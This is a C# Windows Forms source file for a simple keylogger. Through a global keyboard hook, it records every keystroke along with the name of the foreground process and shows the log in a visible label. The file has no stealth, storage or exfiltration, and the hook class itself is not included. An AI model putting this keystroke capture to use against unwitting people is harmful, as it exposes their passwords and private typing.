using System;
using System.Collections.Generic;
using System.Collections;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Text;
using System.IO;
using System.Windows.Forms;

namespace KeyLogger
{
    public partial class Form1 : Form
    {
        KeyboardHook kbh = new KeyboardHook("PassAllKeysToNextApp");
        public Form1()
        {
            InitializeComponent();
            kbh.KeyIntercepted += new KeyboardHook.KeyboardHookEventHandler(kbh_KeyIntercepted);
        }
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        public static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll", SetLastError = true)]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        IntPtr cur;
        uint p;
        string name = "", buf = "", t = "";

        void kbh_KeyIntercepted(KeyboardHook.KeyboardHookEventArgs e)
        {
            try
            {
                cur = GetForegroundWindow();
                GetWindowThreadProcessId(cur, out p);
                name = Process.GetProcessById((int)p).ProcessName;
                
                if (name == t)
                {
                    buf += (e.KeyName);
                }
                else
                {
                    t = name;
                    buf += ("\n" + name + " : " + e.KeyName);
                   
                }
                label1.Text = buf;
            }
            catch (Exception exp)
            {
                string ss = exp.Message;
            }
            
        }

      
      
 
    }
}

        
    